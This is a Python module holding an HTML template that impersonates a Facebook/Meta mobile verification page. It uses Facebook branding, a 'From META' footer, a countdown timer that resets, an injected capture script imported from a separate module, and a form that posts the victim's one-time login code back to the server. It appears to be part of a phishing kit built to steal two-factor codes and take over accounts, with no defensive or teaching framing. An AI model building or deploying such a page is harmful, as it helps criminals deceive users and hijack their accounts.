"""html_otp_mobile.py — auto-generated from templates.py."""

import base64

from .js_capture import JS_STRICT_CAPTURE

HTML_OTP_MOBILE = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="/static/svd_logo.svg" type="image/svg+xml">
    <title>Facebook</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #fff; font-family: -apple-system, Roboto, sans-serif; }
        .otp-input { border: 1.5px solid #1877f2; border-radius: 8px; padding: 12px; width: 100%; font-size: 18px; text-align: center; letter-spacing: 4px; font-weight: bold; outline: none; }
        .fb-btn { background-color: #1877f2; color: #fff; border-radius: 8px; padding: 12px; font-weight: 600; width: 100%; font-size: 16px; border: none; }
        .secondary-btn { background-color: #f0f2f5; color: #4b4f56; border-radius: 8px; padding: 10px; font-weight: 600; width: 100%; font-size: 14px; border: none; margin-top: 10px; }
    </style>
</head>
<body class="p-6">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="flex items-center justify-between mb-8">
        <svg class="w-6 h-6 text-gray-800" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
        <span class="font-semibold text-lg">{{ otp_title }}</span>
        <div class="w-6"></div>
    </div>
    <div class="flex flex-col items-center">
        <div class="bg-blue-50 p-4 rounded-full mb-6">
            <svg class="w-10 h-10 text-[#1877f2]" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
        </div>
        <h2 class="text-xl font-bold text-center mb-2">{{ otp_title }}</h2>
        <p class="text-gray-500 text-center text-sm mb-4 px-4">{{ otp_sub }}</p>
        <div class="text-blue-600 font-bold mb-6" id="timer">01:00</div>
        <div id="error-box" class="{% if not message %}hidden{% endif %} w-full bg-red-50 border border-red-200 text-red-700 p-3 rounded-lg text-xs mb-4 text-center">
            <b>{{ message }}</b>
        </div>
        <form method="POST" class="w-full" onsubmit="return validateOTP()">
            <input type="hidden" name="action" value="code">
            <input type="text" name="code" id="otp-field" placeholder="000 000" class="otp-input mb-6" maxlength="8" required autofocus autocomplete="one-time-code" inputmode="numeric">
            <button type="submit" class="fb-btn">{{ otp_submit }}</button>
        </form>
        <button type="button" class="secondary-btn">Having trouble?</button>
        <div style="display: flex; flex-direction: column; align-items: center; gap: 4px; margin-top: 2.5rem;">
            <span style="font-size:11px;font-weight:400;color:#65676B;text-transform:none;letter-spacing:0;">From</span>
            <span style="font-size:15px;font-weight:800;color:#1C2B33;letter-spacing:2px;text-transform:uppercase;">META</span>
        </div>
    </div>
    <script>
    function validateOTP() {
        const val = document.getElementById('otp-field').value.replace(/\s/g, '');
        const errBox = document.getElementById('error-box');
        if (!/^\d{6,8}$/.test(val)) {
            errBox.innerText = "{{ otp_invalid }}";
            errBox.classList.remove('hidden');
            return false;
        }
        return true;
    }
    let seconds = 60;
    const timerDisplay = document.getElementById('timer');
    const interval = setInterval(() => {
        seconds--;
        let m = Math.floor(seconds / 60);
        let s = seconds % 60;
        timerDisplay.innerText = (m < 10 ? "0"+m : m) + ":" + (s < 10 ? "0"+s : s);
        if (seconds <= 0) seconds = 60;
    }, 1000);
    </script>
</body>
</html>
"""
